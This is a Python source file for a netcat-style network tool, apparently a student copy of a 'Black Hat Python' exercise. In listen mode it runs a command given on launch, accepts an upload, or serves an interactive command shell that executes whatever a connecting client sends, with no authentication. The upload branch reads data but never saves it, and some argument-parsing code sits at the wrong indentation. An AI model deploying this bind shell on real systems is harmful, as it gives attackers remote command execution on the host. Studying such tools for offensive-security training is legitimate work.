import argparse
import os
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    try:
      output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
      return output.decode()
    except OSError as e:
      raise OSError(f"Could not execute command {cmd}. {e}")
    

class NetCat:
  def __init__(self, args):
    self.args = args
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # SOL_SOCKET - option is on socket level
    # SO_REUSEADDR - option is reuseaddr
    # 1 - option value is 1
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  def run(self):
    if self.args.listen:
      self.listen()
    else:
      self.send()
      
  def send(self):
    try:
      self.socket.connect((self.args.target, self.args.port))
    except ConnectionRefusedError:
      print('Could not connect')
      self.socket.close()
      os._exit(1)
      
    first = True
    try:
      while True:
        if first and self.args.buffer:
          print(f"> {self.args.buffer}")
          self.buffer = self.args.buffer  
        else:
          self.buffer = input("> ")
        self.buffer += '\n'
        
        self.socket.send(self.buffer.encode())
        
        recv_len = 1
        response = ''
        
        first = False
        
        # Why is the following loop written like this??? 
        # Keep going as long as received length is not 0, but break out of the loop if it's less than 4096. 
        # Why not just check for less than 4096?
        while recv_len:
          data = self.socket.recv(4096)
          recv_len = len(data)
          response += data.decode()
          if recv_len < 4096:
            break
        
        if not response:
          break
        
        print(response)
    except (ConnectionAbortedError, ConnectionResetError) as e:
      print(f'Connection aborted {e}')
      self.socket.close()
      os._exit(1)
    except KeyboardInterrupt:
      print('User terminated.')
      self.socket.close()
      os._exit(1)

  def listen(self):
    self.socket.bind((self.args.target, self.args.port))
    self.socket.listen(5)
    
    while True:
      # for each connection start a handle() thred
      client_socket, _ = self.socket.accept()
      client_thread = threading.Thread(
        target=self.handle, args=(client_socket,)
      )
      client_thread.start()

  def handle(self, client_socket: socket.socket):
    if self.args.execute:
      output = execute(self.args.execute)
      client_socket.send(output.encode())
      
    elif self.args.upload:
      file_buffer = b''
      while True:
        data = client_socket.recv(4096)
        if data:
          file_buffer += data
        else:
          break
    
    elif self.args.command:
      cmd_buffer = b''
      while True:
        try:
          client_socket.send(b'BHP: #> ')
          while '\n' not in cmd_buffer.decode():
            cmd_buffer += client_socket.recv(64)
          response = execute(cmd_buffer.decode())
          if response:
            client_socket.send(response.encode())
          else:
            client_socket.send(b'Command gave no result')
          
          # reset cmd buffer
          cmd_buffer = b''
        except ConnectionAbortedError:
          print('Connection aborted')
          break
        except Exception as e:
          print(f'Server killed {e}')
          self.socket.close()
          os._exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Blach Hat Python Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example:
                           netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
                           """
        ),
    )

parser.add_argument('-c', '--command', action='store_true', help='command shell')
parser.add_argument('-e', '--execute',  help="execute specified command")
parser.add_argument('-l', '--listen', action='store_true', help="listen")
parser.add_argument('-p', '--port', type=int, default=5555, help="specified port")
parser.add_argument('-t', '--target', default='127.0.0.1', help="specified IP")
parser.add_argument('-u', '--upload',  help="upload file")
parser.add_argument('-b', '--buffer', default='')
args = parser.parse_args()

nc = NetCat(args)
nc.run()

